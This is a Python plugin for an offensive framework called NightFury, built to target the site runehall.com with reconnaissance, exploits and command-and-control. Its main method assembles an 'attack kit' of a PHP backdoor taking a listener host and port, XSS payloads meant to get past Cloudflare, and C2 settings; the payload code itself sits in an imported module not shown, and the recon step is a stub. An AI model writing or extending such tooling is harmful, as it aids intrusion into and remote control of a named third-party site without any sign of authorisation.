import os
import yaml
from core.error_handler import handle_exception
from modules.exploit_pro.runehall_payloads import RuneHallPayloads

class RuneHallPlugin:
    """
    Professional NightFury Plugin for runehall.com.
    Integrates domain-specific recon, exploits, and C2.
    """
    def __init__(self, config_path="/opt/nightfury/config/c2_runehall.yaml"):
        self.payloads = RuneHallPayloads()
        self.config_path = config_path
        self.config = self._load_config()

    def _load_config(self):
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r') as f:
                    return yaml.safe_load(f)
            return {}
        except Exception as e:
            handle_exception(e, {"module": "runehall_plugin", "action": "load_config"})
            return {}

    def run_recon(self):
        """
        Runs domain-specific reconnaissance for RuneHall.
        """
        print(f"[*] Running professional recon for: {self.config.get('infrastructure', {}).get('domain', 'runehall.com')}")
        # In a real scenario, this would trigger more advanced sub-domain and service discovery
        return True

    def generate_attack_kit(self, lhost, lport):
        """
        Generates a full attack kit for RuneHall.
        """
        kit = {
            "php_backdoor": self.payloads.get_php_backdoor(lhost, lport),
            "xss_payloads": self.payloads.get_cloudflare_xss(),
            "c2_config": self.config
        }
        return kit

if __name__ == "__main__":
    plugin = RuneHallPlugin(config_path="../../config/c2_runehall.yaml")
    print("[+] RuneHall Plugin Initialized")
    kit = plugin.generate_attack_kit("127.0.0.1", 4444)
    print(f"[+] Attack kit generated with {len(kit['xss_payloads'])} XSS payloads.")
